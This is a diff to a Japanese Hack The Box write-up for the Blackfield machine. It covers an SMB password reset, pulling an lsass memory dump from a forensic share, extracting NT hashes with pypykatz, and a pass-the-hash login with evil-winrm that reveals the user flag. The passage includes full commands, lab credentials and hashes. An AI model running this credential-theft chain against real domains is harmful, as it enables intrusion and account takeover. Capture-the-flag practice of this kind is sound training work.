@@ -146,7 +146,7 @@ Archive:  DC01_10.129.194.101_2025-10-19_004440_bloodhound.zip
 ```
 audit2020に対して`ForceChangePaasord`権限を有していることを確認  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Blackfield_01.png">  
-audit2020のパスワードをsupportとものに変更
+audit2020のパスワードをsupportと同一のものに変更
 ```sh
 └─$ impacket-changepasswd -ts -newpass '#00^BlackKnight' -no-pass -altuser support -altpass '#00^BlackKnight' -reset 'blackfield.local/audit2020@10.129.194.101'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -159,6 +159,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 
 ## STEP 4
+新たにforensicが読み取り可能に
 ```sh
 └─$ netexec smb 10.129.194.101 -u 'audit2020' -p '#00^BlackKnight' --shares
 SMB         10.129.194.101  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -173,4 +174,123 @@ SMB         10.129.194.101  445    DC01             IPC$            READ        
 SMB         10.129.194.101  445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.129.194.101  445    DC01             profiles$       READ            
 SMB         10.129.194.101  445    DC01             SYSVOL          READ            Logon server share
+```
+メモリダンプのようなものを発見  
+lsass.exeのメモリダンプもあるのでクレデンシャルを取得できるかも
+```sh
+└─$ smbclient -U 'blackfield.local/audit2020%#00^BlackKnight' //10.129.194.101/forensic 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+                5102079 blocks of size 4096. 1685557 blocks available
+
+smb: \> cd memory_analysis
+
+smb: \memory_analysis\> ls
+  .                                   D        0  Thu May 28 16:28:33 2020
+  ..                                  D        0  Thu May 28 16:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
+
+                5102079 blocks of size 4096. 1685557 blocks available
+```
+lsassをダウンロード、めっちゃ時間かかった
+```sh
+└─$ smbget --recursive -U 'blackfield.local/audit2020%#00^BlackKnight' smb://10.129.194.101/forensic/memory_analysis/lsass.zip
+Using domain: BLACKFIELD.LOCAL, user: audit2020
+Using domain: BLACKFIELD.LOCAL, user: audit2020
+smb://10.129.194.101/forensic/memory_analysis/lsass.zip
+                
+Downloaded 39.99MB in 1961 seconds
+```
+windows上のmimikatzでも可能だが、今回はpython製のpypykatzを使用
+svc_backupのNTハッシュを取得
+```sh
+└─$ pypykatz lsa minidump lsass.DMP -p msv       
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+
+~~~省略~~~
+```
+winrmでログイン成功！  
+ユーザフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.194.101 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls ../Desktop
+
+
+    Directory: C:\Users\svc_backup\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/28/2020   2:26 PM             32 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ../Desktop/user.txt
+3920bb317a0bef51027e2852be64b543
+```
+ちなみにadministratorのntハッシュを取得したが、こちらはログイン失敗した  
+多分lsassをダンプした以降にパスワードが変更されてそう
+```sh
+
+== LogonSession ==
+authentication_id 153705 (25869)
+session_id 1
+username Administrator
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T17:59:04.506080+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-500
+luid 153705
+        == MSV ==
+                Username: Administrator
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+                DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
 ```
